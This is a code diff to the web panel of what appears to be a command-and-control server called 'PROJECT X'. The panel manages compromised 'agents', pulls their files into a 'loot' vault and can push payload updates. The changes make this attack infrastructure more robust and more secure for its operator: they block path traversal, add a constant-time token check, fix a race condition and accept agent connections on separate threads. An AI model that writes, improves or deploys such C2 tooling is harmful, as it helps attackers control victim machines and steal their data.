@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ============================================================================
-#  PROJECT X  ·  web.py  ·  phone dashboard + login + loot + push update
+#  PROJECT X  ·  web.py  v4.1  ·  phone dashboard + login + loot + push update
 #  PX_PASS / PX_TOKEN / PX_PAYLOAD   or  --pass / --token / --payload
 # ============================================================================
 import base64, hmac, json, os, secrets, socket, sys, threading, time, urllib.parse
@@ -13,6 +13,12 @@ WEB   = 8080
 LOOT  = os.path.abspath("loot")
 SESSIONS = set()
 FAILS = {"n": 0, "until": 0.0}
+
+
+def _under_loot(rel):
+    """Normalise and confine a user path to the vault (blocks ../../ escapes)."""
+    fp = os.path.abspath(os.path.join(LOOT, rel or ""))
+    return fp if (fp == LOOT or fp.startswith(LOOT + os.sep)) else None
 
 
 def save_loot(agent, name, blob):
@@ -252,7 +258,8 @@ class H(BaseHTTPRequestHandler):
     def authed(self):
         s = self._sid()
         if s and s in SESSIONS: return True
-        return self.q().get("t", [""])[0] == TOKEN or self.headers.get("X-Token") == TOKEN
+        tok = self.q().get("t", [""])[0] or self.headers.get("X-Token") or ""
+        return hmac.compare_digest(tok, TOKEN)     # constant-time
 
     def _login(self):
         sid = secrets.token_hex(16); SESSIONS.add(sid)
@@ -279,13 +286,15 @@ class H(BaseHTTPRequestHandler):
         if p == "/api/agents": return self._j([{"id": a.id, "info": a.info} for a in CT.AGENTS.values()])
         if p == "/api/loot":   return self._j(loot_list())
         if p == "/api/lootget":
-            fp = os.path.join(LOOT, self.q().get("p", [""])[0])
-            if not os.path.isfile(fp): return self._send(404, b"nope", "text/plain")
+            fp = _under_loot(self.q().get("p", [""])[0])
+            if not fp or not os.path.isfile(fp): return self._send(404, b"nope", "text/plain")
             return self._send(200, open(fp, "rb").read(), "application/octet-stream",
                               {"Content-Disposition": f'attachment; filename="{os.path.basename(fp)}"'})
         if p == "/api/lootdel":
-            try: os.remove(os.path.join(LOOT, self.q().get("p", [""])[0]))
-            except OSError: pass
+            fp = _under_loot(self.q().get("p", [""])[0])
+            if fp:
+                try: os.remove(fp)
+                except OSError: pass
             return self._j({"ok": True})
         if p == "/api/lootwipe":
             import shutil; shutil.rmtree(LOOT, ignore_errors=True); return self._j({"ok": True})
@@ -299,7 +308,7 @@ class H(BaseHTTPRequestHandler):
                 return self._j(a.req("ls", {"path": self.q().get("path", [""])[0] or None}).get("data") or {})
             if p == "/api/file":
                 a.req("get", {"path": self.q().get("path", [""])[0]}, timeout=900)
-                got = a.collect(a._n)
+                got = a.collect(a.last_xid)          # was a._n (racy)
                 if not got: return self._send(404, b"no data", "text/plain")
                 save_loot(a.id, got[0], got[1])
                 return self._send(200, got[1], "application/octet-stream",
@@ -357,8 +366,12 @@ def listen(port, tls=None):
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(*tls)
         srv = ctx.wrap_socket(srv, server_side=True)
     while True:
-        try: CT.client_thread(*srv.accept())
-        except Exception: pass
+        try:
+            sock, addr = srv.accept()
+            # FIX: thread per agent instead of blocking the accept loop
+            threading.Thread(target=CT.client_thread, args=(sock, addr), daemon=True).start()
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
